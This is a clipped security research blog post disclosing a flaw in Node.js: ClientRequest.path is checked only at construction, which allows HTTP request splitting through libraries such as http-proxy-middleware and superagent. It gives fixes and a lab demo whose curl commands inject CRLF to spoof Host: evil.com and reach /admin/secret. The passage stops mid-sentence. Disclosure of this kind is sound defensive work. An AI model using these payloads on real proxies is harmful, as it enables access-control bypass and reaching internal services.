---
title: "The Forgotten Bug: How a Node.js Core Design Flaw Enables HTTP Request Splitting | CyberSec Notes"
source: https://r3verii.github.io/cve/2026/02/27/nodejs-toctou.html
source_host: r3verii.github.io
clip_date: 2026-10-20T10:18:50+08:00
trace_id: 67d6d185-9427-4055-b962-1557b4db2042
content_hash: a0a51e8b8f80504e14062c5f235019c10a98b997c5136f2e9b8fddd3808463a2
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: r3verii·Web协议漏洞研究
ai_summary: HTTP 请求拆分并非旧闻：Node.js 在构造 ClientRequest 时校验 path，但该属性仍可直接写入，发送前 `_implicitHeader()` 又原样拼接使用，形成 TOCTOU 缺口（检查与使用之间的时间差），导致 7 个主流库受影响。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3ff75244-d011-819f-818b-faa73f77ac8c
ioc:
  cves:
    - CVE-2018-12116
  cwes:
    - CWE-115
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> HTTP 请求拆分并非旧闻：Node.js 在构造 ClientRequest 时校验 path，但该属性仍可直接写入，发送前 `_implicitHeader()` 又原样拼接使用，形成 TOCTOU 缺口（检查与使用之间的时间差），导致 7 个主流库受影响。
> 
> - **官方定性：** 通过 HackerOne 上报后，Node.js 安全团队认为这项问题不在其当前威胁模型内，不算漏洞，因此作者公开发文提醒生态。
> - **前身 CVE-2018-12116：** CVSS 7.5；latin1 单字节编码把 Unicode 截断成 `\r`/`\n` 字节；修复方式为构造期正则 `/[^\u0021-\u00ff]/` 拦截。
> - **缺口成因：** `this.path = options.path || '/'` 为普通可写属性，无 setter、Proxy 或私有字段；`.write()`、`.end()`、`.pipe()` 触发的 `_implicitHeader()` 直接拼接 `method + ' ' + path + ' HTTP/1.1\r\n'`，不再校验。
> - **受影响库：** node-http-proxy、http-proxy-middleware、http-proxy-3（Vite）、httpxy（Nitro）、superagent、request 及其 fork 版本、@hapi/wreck，合计周下载量 1.6 亿次以上，分别在 `proxyReq`、`'request'` 事件或延迟 pipe 时暴露原始 ClientRequest。
> - **影响分级：** 单 `\r\n` 可注入任意头，如 Authorization、Host；加 Content-Length 可注入 body；加 `\r\n\r\n` 及新请求行可拆分出第二条完全独立的请求，区别于 CL/TE 请求走私。
> 
> **修复建议：** 最小方案是在 `_implicitHeader()` 中先 `String(this.path)` 规范化一次再复校验（避免 toString 二次 TOCTOU）；更稳妥是 prototype setter 用 `Object.defineProperty` 在赋值时 fail-fast（立即失败），两者叠加。安全实现策略：先 flush 再暴露（got、needle）、永不暴露（follow-redirects、axios）、改用 fetch/undici、或用 WHATWG `new URL()` 预编码。
> 
> **演示：** Express 代理直接把路由参数赋给 `proxyReq.path`，curl 传 `%0D%0A` 经 Express 解码后绕过校验，后端日志从 1 条变 2 条（`/admin/secret` 从未被客户端请求）。

![Cover](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/659b8629b8df3ccb.png)

* * *

> **RESPONSIBLE DISCLOSURE NOTICE**
> 
> This vulnerability was reported to Node.js through their HackerOne program. The Node.js security team has assessed it and determined it is **not a vulnerability under their current threat model**. This paper is published to inform the ecosystem and help developers protect their applications.

## 1\. Prologue: A Bug That Won’t Die

In 2018, a researcher discovered that Node.js’s `http.request()` would happily pass Unicode characters through to the wire, where latin1 encoding would truncate them into CRLF bytes — enabling HTTP Request Splitting. It was assigned [CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116), scored CVSS 7.5 HIGH, and promptly fixed.

The fix added a regex validation to reject paths containing characters outside `\u0021-\u00ff`:

```javascript
// lib/_http_client.js (the 2018 fix, still present today)
const INVALID_PATH_REGEX = /[^\u0021-\u00ff]/;

if (options.path) {
    const path = String(options.path);
    if (INVALID_PATH_REGEX.test(path)) {
        throw new ERR_UNESCAPED_CHARACTERS('Request path');
    }
}
```

Case closed. Right?

**Not quite.** The 2018 fix has a fundamental design flaw: **it only runs at construction time.** The property it validates — `this.path` — remains a plain writable JavaScript property with no setter, no proxy, no `Object.defineProperty` guard. Any code that mutates `ClientRequest.path` after construction completely bypasses this validation.

And as I discovered, **an enormous amount of code does exactly that.**

* * *

## 2\. The 2018 Precedent: CVE-2018-12116

To understand the current bug, we need to understand its predecessor.

### CVE-2018-12116 — HTTP Request Splitting via Unicode

| Field | Value |
| --- | --- |
| **CVE** | [CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116) |
| **CVSS** | 7.5 HIGH |
| **Affected** | Node.js < 6.15.0, < 8.14.0, < 10.14.0, < 11.3.0 |
| **Reporter** | [Arkadiy Tetelman](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/) (Lob) |
| **CWE** | CWE-115 (Misinterpretation of Input) |

**The Mechanism:** Node.js versions 8 and below used `latin1` encoding when constructing HTTP requests without a body. Latin1 is a single-byte encoding — it can’t represent high Unicode characters, so it *truncates them to their lowest byte*.

An attacker could craft Unicode characters that, when truncated to latin1, produced HTTP control bytes:

-   `\u{010D}` → `\x0D` (Carriage Return, `\r`)
-   `\u{010A}` → `\x0A` (Line Feed, `\n`)

This meant a path like `"/safe\u{010D}\u{010A}\u{010D}\u{010A}GET /admin"` would pass any ASCII validation, but on the wire would become `"/safe\r\n\r\nGET /admin"` — a fully split second HTTP request.

**The Fix:** Reject any path containing characters outside the range `\u0021-\u00ff` at construction time.

The fix was effective for its specific attack vector. But it introduced an assumption that would prove dangerous: **that validation at construction time is sufficient.**

* * *

## 3\. The Root Cause: Anatomy of the TOCTOU

The vulnerability I found is a classic [TOCTOU (Time-of-Check-Time-of-Use)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) bug.

```swift
              TIME ─────────────────────────────────────────────────────►
    ┌──────────────────┐         ┌─────────────────────┐        ┌──────────────────┐
    │  http.request()  │         │   TOCTOU WINDOW     │        │ _implicitHeader()│
    │                  │         │                     │        │                  │
    │  options.path    │         │  ClientRequest      │        │  this.path used  │
    │  is VALIDATED    │         │  is EXPOSED to      │        │  directly in     │
    │  against         │────────►│  user code via      │───────►│  HTTP request    │
    │  INVALID_PATH_   │         │  events/callbacks   │        │  line — NO       │
    │  REGEX           │         │                     │        │  re-validation   │
    │                  │         │  .path is a PLAIN   │        │                  │
    │  ✅✅ CHECK     │         │  WRITABLE property  │        │  ❌❌ USE       │
    └──────────────────┘         └─────────────────────┘        └──────────────────┘
                                          🡩
                                          |
                                  ┌─────────────────────┐
                                  │  ATTACKER MUTATES   │
                                  │  clientReq.path =   │
                                  │  "/x\r\n\r\nGET /"  │
                                  │                     │
                                  │  Validation is      │
                                  │  NEVER re-run       │
                                  └─────────────────────┘
```

In simple terms:

1.  **CHECK**: When you call `http.request(options)`, Node.js validates `options.path` against `INVALID_PATH_REGEX`. If it contains CRLF characters (`\r`, `\n`) or characters outside `\u0021-\u00ff`, it throws an error. Good.
    
2.  **WINDOW**: The resulting `ClientRequest` object has a `.path` property that is a **plain writable JavaScript property**— `this.path = options.path || '/'`. No setter. No `Object.defineProperty`. No `Proxy`. Any code with a reference to the object can write to it freely.
    
3.  **USE**: When the request is actually sent (triggered by `.write()`, `.end()`, or `.pipe()`), the method `_implicitHeader()` reads `this.path` directly and concatenates it into the HTTP request line: `this.method + ' ' + this.path + ' HTTP/1.1\r\n'`. **No re-validation.**
    

The gap between step 1 and step 3 is the TOCTOU window. Any mutation of `.path` during this window bypasses all CRLF validation.

* * *

## 4\. Walking Through the Source Code

Let’s trace exactly what happens in the Node.js source code. All references are to the current Node.js `main` branch at time of writing.

### 4.1 — The Validation (Construction Time)

File: **`lib/_http_client.js`**— [source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L117)

```javascript
// Line 117: The regex that guards against CRLF
const INVALID_PATH_REGEX = /[^\u0021-\u00ff]/;
```

This regex matches any character *outside* the printable latin1 range. Notably, `\r` (`\u000D`) and `\n` (`\u000A`) are **below** `\u0021`, so they are caught by this regex. This is the CVE-2018-12116 fix.

[source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L235-L241)

```javascript
// Lines 235-241: Validation runs ONCE, at construction
if (options.path) {
    const path = String(options.path);
    if (INVALID_PATH_REGEX.test(path)) {
        debug('Path contains unescaped characters: "%s"', path);
        throw new ERR_UNESCAPED_CHARACTERS('Request path');
    }
}
```

So far, so good. CRLF in the constructor path = error thrown.

### 4.2 — The Assignment (No Protection)

[source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L306)

```javascript
// Line 306: Plain property assignment — no setter, no guard
this.path = options.path || '/';
```

This is just a regular JavaScript property. There is no:

-   `Object.defineProperty()` with a setter that validates
-   `Proxy` trap
-   Private field (`#path`)
-   Frozen/sealed property

Any code that has a reference to the `ClientRequest` object can do `req.path = anything` and it will succeed silently.

### 4.3 — The Use (No Re-validation)

[source](https://github.com/nodejs/node/blob/main/lib/_http_client.js#L475-L481)

```javascript
// Lines 475-481: _implicitHeader() — called by .write(), .end(), .pipe()
ClientRequest.prototype._implicitHeader = function _implicitHeader() {
    if (this._header) {
        throw new ERR_HTTP_HEADERS_SENT('render');
    }
    this._storeHeader(
        this.method + ' ' + this.path + ' HTTP/1.1\r\n',
        //                   ^^^^^^^^^
        //                   READ DIRECTLY — NO RE-VALIDATION
        this[kOutHeaders]
    );
};
```

This is where the damage happens. `this.path` is read raw and concatenated directly into the HTTP request line. If `.path` now contains `\r\n`, those bytes go directly onto the TCP socket.

### 4.4 — The Wire Format

`_storeHeader()` (in `lib/_http_outgoing.js`) takes that first line and builds the complete HTTP message — [source](https://github.com/nodejs/node/blob/main/lib/_http_outgoing.js#L397):

```javascript
// lib/_http_outgoing.js, line 397
function _storeHeader(firstLine, headers) {
    // firstLine = 'GET /index.html HTTP/1.1\r\n'   ← normal
    // firstLine = 'GET /x\r\n\r\nGET /admin HTTP/1.1\r\n'  ← SPLIT!
    const state = {
        // ...
        header: firstLine,   // ← stored directly, no sanitization
    };
    // ... processes headers, appends them to state.header ...
    // ... writes state.header to the socket ...
}
```

The content flows directly to the TCP socket. If the path contained CRLF sequences, they are written as-is — enabling anything from header injection to full request splitting, depending on the payload.

* * *

## 5\. “Possible” fix for the root cause

This issue is not inherently “in” proxy libraries. Proxy libraries expose legitimate hooks (e.g. `proxyReq`, `proxyReq.path`) to customize the outbound request. The core problem is a **time-of-check/time-of-use (TOCTOU)** gap in Node.js’ HTTP client: the request path is validated when the `ClientRequest` is created, but the request-line is rendered later using the **current** value of `this.path`. If `path` is mutated after construction—especially via low-level hooks—an attacker-controlled value can reach the request-line.

### What the fix must guarantee

Whatever is used in the request-line must always be:

1.  **Canonicalized** as a string (`String(...)`),
2.  **Validated** using the same rules (`INVALID_PATH_REGEX` / `ERR_UNESCAPED_CHARACTERS`),
3.  Checked **at the point of serialization**, and ideally also **at the point of mutation**.

A subtle but important requirement: avoid evaluating `this.path` multiple times. If `this.path` is not a plain string (e.g. an object with a custom `toString()`), reading it twice can reintroduce a TOCTOU *inside* the fix.

Below are two options. They are compatible and can be combined for defense-in-depth.

* * *

### Option B (minimal / upstream-friendly): re-validate in \_implicitHeader()

This is the lowest-impact change: validate **right before** building the request-line. The key is to stringify once and reuse the same value for both validation and header construction.

```javascript
ClientRequest.prototype._implicitHeader = function _implicitHeader() {
  if (this._header) {
    throw new ERR_HTTP_HEADERS_SENT('render');
  }

  // Canonicalize once (prevents TOCTOU via toString side effects)
  const path = String(this.path);

  // Re-validate: if `path` was mutated after construction, fail here
  if (INVALID_PATH_REGEX.test(path)) {
    throw new ERR_UNESCAPED_CHARACTERS('Request path');
  }

  // (Optional hardening) apply the same principle to `method`
  const method = String(this.method);

  this._storeHeader(method + ' ' + path + ' HTTP/1.1\r\n', this[kOutHeaders]);
};
```

**Pros**

-   Minimal behavioral change: no public API changes, only adds a guard.
-   Closes the “mutate-after-construction → request-line injection” class of bugs.

**Cons**

-   The failure is *deferred*: it triggers when the request is about to write headers, not at the moment of mutation.

* * *

### Option A (fail-fast): validate at the path setter

This approach fails **immediately** when code tries to set an illegal path. To avoid a new TOCTOU, the setter must store the **canonicalized** string (not the original value).

```javascript
Object.defineProperty(ClientRequest.prototype, 'path', {
  get() { return this._path; },
  set(value) {
    // Canonicalize once
    const v = String(value);

    // Same validation used at construction time
    if (INVALID_PATH_REGEX.test(v)) {
      throw new ERR_UNESCAPED_CHARACTERS('Request path');
    }

    // (Optional) prevent changes after headers are rendered
    // if (this._header) throw new ERR_HTTP_HEADERS_SENT('render');

    this._path = v; // store the canonicalized string
  }
});
```

**Pros**

-   Fail-fast: stops dangerous mutations at their source (great for safety and debugging).
-   Prevents non-string `path` values (with “creative” `toString()`) from living inside `ClientRequest`.

**Cons**

-   Potential compatibility impact: turning `path` into a prototype accessor can affect edge cases (introspection, assumptions about “own” properties, etc.).
-   Needs careful review against internal Node code paths that assign to `req.path`.

* * *

### Practical recommendation

If the goal is an upstream-acceptable hardening:

-   **Option B** is the most realistic minimal fix.
-   **Option A + Option B** is the strongest defense-in-depth: fail at mutation, and still guard at serialization.

In all cases, the core rule is: **canonicalize once, validate once, then use that frozen value for request-line rendering**.

* * *

## 6\. The Impact Spectrum: From Header Injection to Request Splitting

This is not a single attack. Depending on how CRLF characters are injected into `ClientRequest.path`, the impact ranges from header injection to complete request splitting. The `_implicitHeader()` method concatenates the path directly into the request line — so whatever bytes are in `.path`, they go on the wire verbatim.

Here’s the full spectrum:

### Level 1: Header Injection

Injecting a single `\r\n` after the HTTP version allows adding arbitrary headers to the outgoing request.

```yaml
Mutated path:  /legit HTTP/1.1\r\nX-Injected: malicious-value\r\nX-Foo: bar

On the wire:
    GET /legit HTTP/1.1
    X-Injected: malicious-value      ← injected
    X-Foo: bar                        ← injected
    Host: backend.internal            ← original headers follow
    Connection: keep-alive
```

**Impact:** Override security headers (`Authorization`, `X-Forwarded-For`, `Host`), bypass IP-based ACLs, impersonate internal services.

### Level 2: Body Injection

Injecting `\r\n` sequences to close the headers and begin a body allows injecting content into a request that wasn’t supposed to have a body.

```swift
Mutated path:  /legit HTTP/1.1\r\nContent-Length: 13\r\n\r\n{"admin":true}

On the wire:
    GET /legit HTTP/1.1
    Content-Length: 13                ← injected
                                      ← end of headers
    {"admin":true}                    ← injected body
    Host: backend.internal            ← orphaned, treated as next request start
```

**Impact:** Transform GET requests into requests with bodies, inject JSON/form payloads, alter backend state.

### Level 3: Full Request Splitting

Injecting a complete `\r\n\r\n` sequence (end of headers) followed by a new request line creates **two completely separate HTTP requests** from a single client request.

```
Mutated path:  /legit HTTP/1.1\r\nHost: x\r\n\r\nGET /admin HTTP/1.1\r\nHost: x\r\n\r\n

On the wire — TWO distinct requests:

    ┌─── Request 1 (legitimate) ────────────────┐
    │ GET /legit HTTP/1.1                        │
    │ Host: x                                    │
    │                                            │
    └────────────────────────────────────────────┘
    ┌─── Request 2 (INJECTED) ──────────────────┐
    │ GET /admin HTTP/1.1                        │
    │ Host: x                                    │
    │                                            │
    └────────────────────────────────────────────┘
```

**Impact:** The second request is entirely attacker-controlled — method, path, headers, body. It reaches the backend as a completely independent request. This enables access to internal endpoints, admin panels, or any path the proxy wouldn’t normally allow.

### Quick reference

| Level | Payload pattern | What gets injected | Impact |
| --- | --- | --- | --- |
| **Header Injection** | `/path HTTP/1.1\r\nHeader: value` | Arbitrary headers | Auth bypass, SSRF, header overrides |
| **Body Injection** | `/path HTTP/1.1\r\nContent-Length: N\r\n\r\nbody` | Headers + Body | State mutation, privilege escalation |
| **Request Splitting** | `/path HTTP/1.1\r\nHost: x\r\n\r\nGET /new` | Entire second request | Full control of a second independent request |

> **Note:** This is different from HTTP Request Smuggling (CL/TE desync). Smuggling produces one ambiguous request that is interpreted differently by frontend and backend. Request Splitting produces **two distinct, well-formed requests** on the wire from a single client request. The second request is not ambiguous — it’s a real, complete HTTP request.

* * *

## 7\. The Ecosystem Audit: 7 Vulnerable Libraries

The TOCTOU window is in Node.js core, but it only becomes exploitable when a library **exposes the raw `ClientRequest` object** to user code (or its own internal code) **between construction and header flush**.

I audited the most popular Node.js HTTP client and proxy libraries to determine which ones open this window. Here are the results:

### Vulnerable Libraries (Window OPEN)

| #   | Library | Weekly Downloads | Stars | Window Mechanism |
| --- | --- | --- | --- | --- |
| 1   | **node-http-proxy** | 18.7M | 14.1K | `proxyReq` event on socket callback, before `.pipe()` |
| 2   | **http-proxy-middleware** | 22.6M | 11.1K | Inherits #1 + `pathRewrite` zero sanitization + `fixRequestBody()` flush |
| 3   | **http-proxy-3** | via Vite | —   | Fork of #1, identical pattern |
| 4   | **httpxy** | via Nitro | —   | Fork of #1, identical pattern |
| 5   | **superagent** | 15.9M | 16K | `emit('request', this)` before `req.end()` |
| 6   | **request** (+forks) | 24.4M | 25.9K | `emit('request', req)` before deferred `.write()` /`.end()` |
| 7   | **@hapi/wreck** | 1.7M | —   | `emit('request', req)` + `promise.req` on Stream payloads |

**Combined: ~160M+ weekly downloads with an open TOCTOU window.**

> **Important Note:** This is not an exhaustive list. Any library or custom code that uses `http.request()` and exposes the resulting `ClientRequest` before `_implicitHeader()` is called is potentially affected. The vulnerability surface extends to every custom implementation of HTTP proxying or client code that follows this pattern. There are certainly more libraries out there.

* * *

## 8\. Library-by-Library Deep Dive

### 8.1 — node-http-proxy

> **18.7M downloads/week · 14.1K stars**
> 
> The foundation of Node.js proxying. Used by http-proxy-middleware, Vite (via http-proxy-3), Nuxt (via httpxy), webpack-dev-server, BrowserSync, and hundreds of other tools.

**The Window:**

[source](https://github.com/http-party/node-http-proxy/blob/master/lib/http-proxy/passes/web-incoming.js#L126-L135) · [pipe](https://github.com/http-party/node-http-proxy/blob/master/lib/http-proxy/passes/web-incoming.js#L170)

```javascript
// lib/http-proxy/passes/web-incoming.js

// Line 126: ClientRequest created — path validated here
var proxyReq = (options.target.protocol === 'https:' ? https : http).request(
    common.setupOutgoing(options.ssl || {}, options, req)
);

// Lines 131-135: proxyReq event fires on socket callback
proxyReq.on('socket', function(socket) {
    if (server && !proxyReq.getHeader('expect')) {
        server.emit('proxyReq', proxyReq, req, res, options);
        //          ^^^^^^^^^ ClientRequest exposed — WINDOW OPEN
    }
});

// Line 170: .pipe() triggers _implicitHeader() — WINDOW CLOSES
(options.buffer || req).pipe(proxyReq);
```

**Vulnerable Pattern:**

```javascript
const httpProxy = require('http-proxy');
const proxy = httpProxy.createProxyServer({ target: 'http://backend:8080' });

proxy.on('proxyReq', (proxyReq, req, res) => {
    // ANY mutation of proxyReq.path here bypasses CRLF validation
    proxyReq.path = req.url;                              // raw passthrough
    proxyReq.path = proxyReq.path.replace('/prefix', ''); // prefix strip
    proxyReq.path = '/api' + req.query.target;            // concatenation
});
```

The same pattern applies identically to **http-proxy-3** (used by Vite, 78.4K stars) and **httpxy** (used by Nitro/Nuxt, 57K stars). They are forks with the same architecture.

* * *

### 8.2 — http-proxy-middleware

> **22.6M downloads/week · 11.1K stars**
> 
> The most popular Express/Connect proxy middleware. Built on top of node-http-proxy. Used by Create React App, Angular CLI, webpack-dev-server, and countless production applications.

http-proxy-middleware is built on top of node-http-proxy and inherits the same TOCTOU window via the `on.proxyReq` handler. The vulnerable pattern is identical:

**The Window (inherited from node-http-proxy):**

Any code inside `on.proxyReq` that assigns to `proxyReq.path` bypasses CRLF validation, exactly as in node-http-proxy. http-proxy-middleware simply wraps the configuration:

```javascript
createProxyMiddleware({
    target: 'http://backend:8080',
    on: {
        proxyReq: (proxyReq, req, res) => {
            proxyReq.path = userControlledValue;  // ← TOCTOU: same window as node-http-proxy
        }
    }
});
```

**Note on `fixRequestBody()`:**

[source](https://github.com/chimurai/http-proxy-middleware/blob/master/src/handlers/fix-request-body.ts#L30-L32)

```typescript
// src/handlers/fix-request-body.ts, lines 30-32
const writeBody = (bodyData: string) => {
    proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
    proxyReq.write(bodyData);  // ← calls _implicitHeader() IMMEDIATELY
};
```

`fixRequestBody()` does not modify `proxyReq.path` — it only writes the body. However, the `.write()` call triggers `_implicitHeader()`, which flushes whatever is currently in `proxyReq.path` to the wire. If a path mutation happens *before* `fixRequestBody()` in the same handler, the flush is deterministic rather than race-dependent.

* * *

### 8.3 — superagent

> **15.9M downloads/week · 16K stars**
> 
> Popular HTTP client library with a fluent API. Used for both browser and Node.js.

**The Window:**

[source](https://github.com/ladjs/superagent/blob/master/src/node/index.js#L788) · [emit](https://github.com/ladjs/superagent/blob/master/src/node/index.js#L1220) · [end](https://github.com/ladjs/superagent/blob/master/src/node/index.js#L1291)

```javascript
// src/node/index.js

// Line 788:  ClientRequest created — path validated
this.req = module_.request(options);

// Line 1220: 'request' event emitted — WINDOW OPEN
this.emit('request', this);
// this.req is accessible via the emitted 'this' object

// Line 1291: req.end() called — _implicitHeader() — WINDOW CLOSES
req.end(data);
```

**Vulnerable Pattern:**

```javascript
const superagent = require('superagent');

superagent.get('http://target.com/safe')
    .on('request', (sa) => {
        // sa.req is the raw ClientRequest
        // _implicitHeader() has NOT been called yet
        sa.req.path = '/safe HTTP/1.1\r\nHost: x\r\n\r\nGET /admin';
    })
    .end();
```

While this pattern is less common than proxy path mutations (superagent is typically used as a client, not a proxy), the architectural window is present and any code using the `request` event to modify the underlying `ClientRequest` would be vulnerable.

* * *

### 8.4 — request (+ @cypress/request, postman-request)

> **24.4M combined downloads/week · 25.9K stars**
> 
> Deprecated since 2020 but still massively used. Its forks (@cypress/request, postman-request) are actively maintained.

**The Window:**

[source](https://github.com/request/request/blob/master/request.js#L751) · [emit](https://github.com/request/request/blob/master/request.js#L861)

```javascript
// request.js

// Line 751: ClientRequest created — path validated
self.req = self.httpModule.request(reqOptions);

// Line 861: 'request' event emitted — WINDOW OPEN
self.emit('request', self.req);

// ... start() returns ...

// Deferred via setImmediate/nextTick:
// self.write() / self.end()   ← _implicitHeader() — WINDOW CLOSES
```

The key insight here is the **deferred execution**: `.write()` and `.end()` are scheduled via `setImmediate` / `nextTick`, so they run *after* `start()` returns. The `'request'` event fires synchronously inside `start()`, giving handler code full access to the `ClientRequest` before any data is sent.

**Vulnerable Pattern:**

```javascript
const request = require('request');  // or @cypress/request, postman-request

request('http://target.com/safe')
    .on('request', (clientReq) => {
        // clientReq is the raw ClientRequest
        // .write()/.end() are DEFERRED — haven't run yet
        clientReq.path = '/safe HTTP/1.1\r\nHost: x\r\n\r\nGET /admin';
    });
```

| Fork | Weekly Downloads | Status |
| --- | --- | --- |
| **request/request** | 14.7M | Deprecated, same TOCTOU window |
| **@cypress/request** | 7.5M | Active fork, same codebase |
| **postman-request** | 2.2M | Active fork, same codebase |

* * *

### 8.5 — @hapi/wreck

> **1.7M downloads/week**
> 
> The core HTTP client for the Hapi ecosystem. Used in enterprise applications at Walmart, Yahoo, and Mozilla.

**Two distinct vectors:**

**Vector 1 — `'request'` event:**

[source](https://github.com/hapijs/wreck/blob/master/lib/index.js#L186-L188)

```javascript
// lib/index.js

// Line 186: ClientRequest created — path validated
const req = client.request(uri);

// Line 188: 'request' event emitted — WINDOW OPEN
this._emit('request', req);

// Later: req.write(payload) / req.end()  — WINDOW CLOSES
```

**Vector 2 — Stream payload (deferred pipe):**

[source](https://github.com/hapijs/wreck/blob/master/lib/index.js#L316-L331)

```javascript
// lib/index.js, lines 316-331
if (options.payload instanceof Stream) {
    internals.deferPipeUntilSocketConnects(req, stream);
    return req;   // ← returns WITHOUT calling .end()!
}

// The returned req is stored in:
promise.req = req;   // ← accessible before _implicitHeader()
```

When the payload is a `Stream`, wreck defers the pipe until the socket connects. This means `promise.req` is exposed *before* `_implicitHeader()` runs, giving calling code time to mutate `.path`.

**Vulnerable Patterns:**

```javascript
const Wreck = require('@hapi/wreck');

// Vector 1: via events
const client = Wreck.defaults({ events: true });
client.events.on('request', (req) => {
    req.path = '/admin\r\nHost: evil\r\n\r\nGET /secret';
});
await client.get('http://target.com/safe');

// Vector 2: via Stream payload
const { Readable } = require('stream');
const stream = new Readable({ read() { this.push('data'); this.push(null); } });
const promise = Wreck.request('POST', 'http://target.com/safe', { payload: stream });
promise.req.path = '/admin\r\nHost: evil\r\n\r\nPOST /secret';
```

* * *

## 9\. Libraries That Got It Right

Not every library is affected. Several popular HTTP libraries have architectures that naturally close the TOCTOU window, either by accident or by design.

| Library | Weekly Downloads | Why It’s Safe |
| --- | --- | --- |
| **follow-redirects** | 77.7M | `._currentRequest` is private — never exposed via public API |
| **axios** | 45M | Uses follow-redirects internally — no raw `ClientRequest` exposure |
| **undici / fetch()** | 30M+ | Does not use `ClientRequest` at all — entirely different HTTP stack |
| **got** | 24M | Calls `._sendBody()` **BEFORE** emitting `'request'` — headers already flushed |
| **needle** | 3M  | Calls `.end()` **BEFORE** exposing `out.request` to user code |
| **phin / centra** | 1.9M | `req.end()` synchronous in same Promise executor — `req` never exposed |
| **@fastify/reply-from** | 1.5M | Uses `new URL()` (WHATWG) which percent-encodes CRLF characters |
| **express-http-proxy** | 350K | Calls `http.request()` directly with clean options — no post-mutation |
| **h3 `proxyRequest()`** | via Nitro | Uses `fetch()` API, not `http.request()` — independent CRLF validation |

### What Makes a Library Safe?

The pattern is clear. Safe libraries follow one of these strategies:

**1\. Flush before expose**— Call `.write()`, `.end()`, or `.pipe()` *before* emitting events or returning the `ClientRequest` to user code. (`got`, `needle`, `phin`)

**2\. Never expose**— Keep the `ClientRequest` as a private/local variable. Never emit it via events or return it before headers are sent. (`follow-redirects`, `axios`)

**3\. Don’t use `ClientRequest`**— Use `fetch()`, `undici`, or another HTTP implementation that doesn’t have this writable `.path` property. (`h3`, `undici`)

**4\. Encode at construction**— Use `new URL()` (WHATWG parser) which percent-encodes special characters before they ever reach `http.request()`. (`@fastify/reply-from`)

* * *

## 10\. Live Demo

To demonstrate this vulnerability in practice, I set up a minimal but realistic lab: a proxy that rewrites paths using the most common pattern found in real-world code, and a backend that logs every request it receives.

### The Setup

**Backend** (`backend.js`) — a simple Express server that logs every incoming request:

```javascript
const express = require("express");

const app = express();
app.use(express.json());
r_idx = 0;

app.get("*", (req, res) => {
  console.log(`[${++r_idx}] ${req.method} ${req.path}`);
  res.json({
    ok: true,
    source: "target-server",
    method: req.method,
    url: req.originalUrl,
    path: req.path,
    query: req.query,
    headers: {
      host: req.headers.host,
      "x-proxy-test": req.headers["x-proxy-test"] || null,
    },
  });
});

app.post("*", (req, res) => {
  console.log(`[${++r_idx}] ${req.method} ${req.path}`);
  res.json({
    ok: true,
    source: "target-server",
    method: req.method,
    url: req.originalUrl,
    path: req.path,
    query: req.query,
    body: req.body,
    headers: {
      host: req.headers.host,
      "x-proxy-test": req.headers["x-proxy-test"] || null,
    },
  });
});

app.listen(4000, () => {
  console.log("Target server running on http://localhost:4000");
});
```

**Proxy** (`proxy.js`) — an Express proxy that extracts a catch-all parameter and assigns it to `proxyReq.path`:

```javascript
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

app.use('/proxy/:target(*)', createProxyMiddleware({
  target: 'http://backend:4000',
  changeOrigin: true,
  on: {
    proxyReq: (proxyReq, req) => {
      proxyReq.path = '/' + req.params.target;
      console.log(`[PROXY] ${req.method} ${req.originalUrl} -> ${proxyReq.path}`);
    }
  }
}));

app.listen(3000, '0.0.0.0', () => {
  console.log('Proxy running on http://0.0.0.0:3000');
  console.log('  Example: /proxy/hello');
});
```

This is a completely realistic pattern. The proxy takes a path from the URL (`:target` parameter), prepends `/`, and assigns it to `proxyReq.path`. This is exactly how dozens of real-world proxies handle path rewriting.

The problem: `req.params.target` comes directly from the user’s URL. Express decodes percent-encoded characters in route parameters. So `%0D%0A` in the URL becomes `\r\n` in `req.params.target`, which then flows into `proxyReq.path` — **after** `INVALID_PATH_REGEX` validation has already passed.

### Exploit: Header Injection

A single request with percent-encoded CRLF in the path:

```bash
curl "http://localhost:3000/proxy/hello%20HTTP/1.1%0D%0AX-Injected:%20true%0D%0AHost:%20evil.com%0D%0A%0D%0A"
```

The proxy decodes this and assigns to `proxyReq.path`:

```
/hello HTTP/1.1\r\nX-Injected: true\r\nHost: evil.com\r\n\r\n
```

The backend receives a request with the injected `X-Injected` header and a spoofed `Host`.

### Exploit: Full Request Splitting

```bash
curl "http://localhost:3000/proxy/hello%20HTTP/1.1%0D%0AHost:%20x%0D%0A%0D%0AGET%20/admin/secret%20HTTP/1.1%0D%0AHost:%20x%0D%0A%0D%0A"
```

The proxy sends **one** request. The backend logs **two**:

```
[1] GET /hello
[2] GET /admin/secret    ← this was never requested by the client
```

One curl command, two backend requests. The second request (`GET /admin/secret`) is entirely attacker-
